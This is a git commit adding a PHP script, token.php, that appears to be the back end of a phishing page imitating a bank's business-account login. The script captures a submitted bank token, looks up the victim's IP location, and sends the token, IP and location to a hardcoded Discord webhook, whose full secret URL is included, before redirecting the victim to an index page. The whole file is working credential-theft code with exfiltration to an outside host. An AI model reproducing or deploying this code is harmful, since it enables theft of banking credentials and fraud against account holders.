f2394256bedc361a96a1f857b9fd59b68f8be62e
morph3us777 <morpheuscassian@gmail.com>
2025-05-30 16:37:48 -0500

    Add files via upload

---
+++ empresas/debito_juridica/php/token.php
@@ -0,0 +1,109 @@
+<?php
+session_start();
+
+$_SESSION['autenticado'] = true;
+
+$token  = isset($_POST['token_bnc']) ? trim($_POST['token_bnc']) : 'No especificada';
+
+$_SESSION['token_bnc'] = $token;
+
+function getUserIP() {
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        return $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        return trim($ipList[0]);
+    } else {
+        return $_SERVER['REMOTE_ADDR'];
+    }
+}
+
+$ip = getUserIP();
+
+$detalle_ip = @file_get_contents("http://ip-api.com/json/$ip");
+$detalle_ip = json_decode($detalle_ip, true);
+
+$country = $region = $city = "Desconocido";
+if ($detalle_ip && $detalle_ip['status'] === 'success') {
+    $country = $detalle_ip['country'];
+    $region  = $detalle_ip['regionName'];
+    $city    = $detalle_ip['city'];
+}
+
+$uniqueId = strtoupper(substr(md5($ip), 0, 4));
+$mapLink  = "https://www.google.com/maps/search/?api=1&query=$ip";
+
+$data = [
+    "content" => "🔑 **TOKEN BNC** 🔑",
+    "embeds" => [
+        [
+            "title" => "CUENTA EMPRESAS (DEBITO JURIDICA)🔑",
+            "color" => 3447003,
+            "fields" => [
+                [
+                    "name" => "🔑 Token:",
+                    "value" => $token,
+                    "inline" => true
+                ],
+                [
+                    "name" => "📌 IP:",
+                    "value" => $ip,
+                    "inline" => false
+                ],
+                [
+                    "name" => "📍 Ciudad:",
+                    "value" => $city,
+                    "inline" => true
+                ],
+                [
+                    "name" => "🗺️ Región:",
+                    "value" => $region,
+                    "inline" => true
+                ],
+                [
+                    "name" => "🌎 País:",
+                    "value" => $country,
+                    "inline" => true
+                ],
+                [
+                    "name" => "📅 Fecha:",
+                    "value" => date('d-m-Y H:i:s'),
+                    "inline" => false
+                ],
+                [
+                    "name" => "#️⃣ ID de Usuario:",
+                    "value" => "#$uniqueId",
+                    "inline" => false
+                ]
+            ]
+        ]
+    ],
+    "username" => "BNC Bot"
+];
+
+$webhookUrl = "https://discord.com/api/webhooks/1359316935682297886/_U0RICZb0WDAfGDYDYrfJUOvUVis-pV80eP2owktMuIUq7yOiKlm8BjmdJrf5R9nsa5v";
+
+$options = [
+    "http" => [
+        "header"  => "Content-Type: application/json\r\n",
+        "method"  => "POST",
+        "content" => json_encode($data)
+    ]
+];
+
+$context = stream_context_create($options);
+@file_get_contents($webhookUrl, false, $context);
+
+$_SESSION = [];
+session_destroy();
+if (ini_get("session.use_cookies")) {
+    $params = session_get_cookie_params();
+    setcookie(session_name(), '', time() - 42000,
+        $params["path"], $params["domain"],
+        $params["secure"], $params["httponly"]
+    );
+}
+
+header("Location: ../../../index.html");
+exit;
+?>
